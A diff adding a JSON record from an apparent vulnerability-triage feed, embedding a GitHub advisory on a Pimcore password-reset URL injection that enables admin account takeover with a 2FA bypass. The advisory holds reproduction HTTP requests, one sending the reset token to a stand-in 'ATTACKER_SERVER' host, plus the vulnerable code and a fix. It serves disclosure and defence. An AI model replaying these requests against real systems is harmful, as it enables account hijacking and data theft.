@@ -1,0 +1,60 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/182125216?v=4\", \"events_url\": \"https://api.github.com/users/byteoverride/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/byteoverride/followers\", \"following_url\": \"https://api.github.com/users/byteoverride/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/byteoverride/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/byteoverride\", \"id\": 182125216, \"login\": \"byteoverride\", \"node_id\": \"U_kgDOCtsCoA\", \"organizations_url\": \"https://api.github.com/users/byteoverride/orgs\", \"received_events_url\": \"https://api.github.com/users/byteoverride/received_events\", \"repos_url\": \"https://api.github.com/users/byteoverride/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/byteoverride/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/byteoverride/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/byteoverride\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-55207\", \"cvss\": {\"score\": 8.8, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 8.8, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-640\", \"name\": \"Weak Password Recovery Mechanism for Forgotten Password\"}], \"description\": \"## Summary\\n\\nAn unauthenticated attacker takes over any Pimcore admin account by sending a password reset request with an attacker-controlled `resetPasswordUrl`. The server generates a real cryptographic recovery token, appends it to the attacker's URL, and emails the link to the victim. When the victim clicks the link in their email, the token is sent to the attacker's server. The attacker then uses `POST /pimcore-studio/api/login/token` to authenticate as the victim with full admin privileges. Token login explicitly disables two-factor authentication, so even accounts with TOTP/Google Authenticator are compromised.\\n\\n## Vulnerability Details\\n\\n### Unauthenticated Endpoint Accepts Attacker URL\\n\\nThe reset password endpoint at `src/User/Controller/ResetPasswordController.php` line 53 is public (uses `PUBLIC_STUDIO_API` voter). The `ResetPassword` schema at `src/User/Schema/ResetPassword.php` accepts a `resetPasswordUrl` string as a required parameter with zero validation. No URL scheme check, no domain allowlist, no comparison against the configured system domain.\\n\\n```php\\nfinal readonly class ResetPassword\\n{\\n    public function __construct(\\n        private string $username,\\n        private string $resetPasswordUrl  // attacker-controlled, no validation\\n    ) {}\\n}\\n```\\n\\n### Token Appended to Attacker URL\\n\\nIn `src/User/Service/UserLoginService.php` at line 64-65, the service generates a real recovery token and concatenates the attacker's URL with the token:\\n\\n```php\\n$token = $this->authenticationResolver->generateTokenByUser($user);\\n$loginUrl = $resetPassword->getResetPasswordUrl() . '?token=' . $token;\\n```\\n\\nThe token is generated and stored in the database BEFORE `sendResetPasswordMail()` is called on line 68. Even if email delivery fails, the token exists.\\n\\n### Token Login Bypasses 2FA\\n\\n`src/Security/Authenticator/AdminTokenAuthenticator.php` line 60 explicitly disables 2FA on token login:\\n\\n```php\\n$pimcoreUser->setTwoFactorAuthentication('required', false);\\n```\\n\\n### Token Validity\\n\\nThe token is encrypted with the application secret, valid for 24 hours, and single-use (nullified after authentication). The attacker's server captures it before the victim completes any reset flow.\\n\\n## Steps to Reproduce\\n\\nTested on Pimcore 12.x (2026.x branch, latest commit `82f9ff6`), Docker, PHP 8.4.\\n\\n### 1. Send password reset with attacker URL (no authentication needed)\\n\\n```http\\nPOST /pimcore-studio/api/user/reset-password HTTP/1.1\\nHost: TARGET\\nContent-Type: application/json\\n\\n{\\\"username\\\":\\\"admin\\\",\\\"resetPasswordUrl\\\":\\\"https://ATTACKER_SERVER:9999/steal\\\"}\\n```\\n<img width=\\\"1756\\\" height=\\\"882\\\" alt=\\\"image\\\" src=\\\"https://github.com/user-attachments/assets/9cb90c8e-6c08-4cd6-980a-822bbd35dc23\\\" />\\n\\n- Response: 500 (email delivery failed in test env, but token def5020020bd133... visible in error trace, confirmed generated in DB\\n\\n### 2. Confirm token was generated\\n\\nDatabase query shows the recovery token was created:\\n\\n```\\n name    has_token   token_prefix\\n admin   1           def50200cdbd3c1292288a716c623f\\n```\\n\\n### 3. Token login (after victim clicks the link in their email)\\n\\n```http\\nPOST /pimcore-studio/api/login/token HTTP/1.1\\nHost: TARGET\\nContent-Type: application/json\\n\\n{\\\"token\\\":\\\"def50200cdbd3c1292288a716c623f...full_token...\\\"}\\n```\\n\\n**Response:**\\n\\n```\\nHTTP/1.1 200 OK\\nSet-Cookie: PHPSESSID=48d784c5bfcc09c8b897f2ab34038419; path=/; httponly; samesite=strict\\nSet-Cookie: pimcore_studio_auth_profile_token=d7a9ad; path=/; httponly; samesite=lax\\n```\\n<img width=\\\"1756\\\" height=\\\"679\\\" alt=\\\"image\\\" src=\\\"https://github.com/user-attachments/assets/53bf8f30-47c1-4398-b386-9929b77a35b5\\\" />\\n\\n### 4. Verify full admin access with the stolen session\\n\\n```http\\nGET /pimcore-studio/api/users HTTP/1.1\\nHost: TARGET\\nCookie: PHPSESSID=48d784c5bfcc09c8b897f2ab34038419\\n```\\n\\n**Response:** `HTTP/1.1 200 OK`\\n\\n```json\\n{\\\"totalItems\\\":1,\\\"items\\\":[{\\\"id\\\":1,\\\"username\\\":\\\"admin\\\",\\\"additionalAttributes\\\":[]}]}\\n```\\n<img width=\\\"1668\\\" height=\\\"906\\\" alt=\\\"image\\\" src=\\\"https://github.com/user-attachments/assets/8f2b63b0-6357-4fe6-9689-35eb891de5ab\\\" />\\n\\nFull admin session obtained. All CMS content, assets, PIM data, user accounts, and system configuration are accessible.\\n\\n## Impact\\n\\nAn unauthenticated attacker who knows a valid admin username takes over the account with full administrative privileges. The only user interaction is the victim clicking a password reset link in a legitimate email from the Pimcore instance. The email comes from the real Pimcore server, making it indistinguishable from a genuine reset email.\\n\\nThe attack bypasses authentication (public endpoint), two-factor authentication (explicitly disabled on token login), and rate limiting (allows 3 attempts per window, trivially worked around with multiple IPs).\\n\\nOnce authenticated as admin, the attacker controls all CMS content, digital assets, PIM product data, user accounts, system configuration, and server-side code execution via class definitions.\\n\\n## Recommended Fix\\n\\nRemove the `resetPasswordUrl` parameter entirely and construct the URL server-side from the configured system domain:\\n\\n```php\\n$loginUrl = 'https://' . $this->domain . '/admin/login?token=' . $token;\\n```\\n\\nIf the frontend needs to specify the URL for multi-domain setups, validate the host against the configured domain and any registered Site domains.\\n\\n## Supporting Materials\\n\\n- Live-tested on Pimcore 12.x (2026.x branch, Docker, PHP 8.4)\\n- Package: `pimcore/studio-backend-bundle`\\n- Distinct from CVE-2021-39189 (user enumeration in password reset, not URL injection)\", \"epss\": {\"percentage\": 0.00666, \"percentile\": 0.49033}, \"ghsa_id\": \"GHSA-h854-c3m3-mh5v\", \"github_reviewed_at\": \"2026-08-28T19:04:16Z\", \"html_url\": \"https://github.com/advisories/GHSA-h854-c3m3-mh5v\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-h854-c3m3-mh5v\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-55207\"}], \"nvd_published_at\": \"2026-07-09T21:16:55Z\", \"published_at\": \"2026-08-28T19:04:16Z\", \"references\": [\"https://github.com/pimcore/pimcore/security/advisories/GHSA-h854-c3m3-mh5v\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-55207\", \"https://github.com/pimcore/studio-backend-bundle/pull/1882\", \"https://github.com/pimcore/studio-backend-bundle/commit/ea9d329686f5e5aea2eec378d63ac2deb965bb27\", \"https://github.com/pimcore/studio-backend-bundle/releases/tag/v2025.4.6\", \"https://github.com/pimcore/studio-backend-bundle/releases/tag/v2026.1.6\", \"https://github.com/advisories/GHSA-h854-c3m3-mh5v\"], \"repository_advisory_url\": \"https://api.github.com/repos/pimcore/pimcore/security-advisories/GHSA-h854-c3m3-mh5v\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/pimcore/pimcore\", \"summary\": \"Pimcore: Account Takeover via Password Reset URL Injection allows unauthenticated attacker to hijack any admin account with 2FA bypass\", \"type\": \"reviewed\", \"updated_at\": \"2026-08-28T19:04:16Z\", \"url\": \"https://api.github.com/advisories/GHSA-h854-c3m3-mh5v\", \"vulnerabilities\": [{\"first_patched_version\": \"2025.4.6\", \"package\": {\"ecosystem\": \"composer\", \"name\": \"pimcore/studio-backend-bundle\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 2025.4.6\"}, {\"first_patched_version\": \"2026.1.6\", \"package\": {\"ecosystem\": \"composer\", \"name\": \"pimcore/studio-backend-bundle\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 2026.1.0, < 2026.1.6\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-h854-c3m3-mh5v",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "pimcore/studio-backend-bundle: < 2025.4.6",
+      "pimcore/studio-backend-bundle: >= 2026.1.0, < 2026.1.6"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2021-39189",
+      "CVE-2026-55207"
+    ],
+    "cvss_score": 8.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "pimcore/studio-backend-bundle"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-08-28T21:56:46.517882Z",
+  "provenance": {
+    "content_sha256": "70a6030a11771c96b2e69fef5f9b5ce55e148d10b884126eab353a3ff6eba1a9",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-08-28T19:04:16Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-h854-c3m3-mh5v",
+  "status": "active",
+  "title": "Pimcore: Account Takeover via Password Reset URL Injection allows unauthenticated attacker to hijack any admin account with 2FA bypass",
+  "updated_at": "2026-08-28T19:04:16Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-h854-c3m3-mh5v"
+}
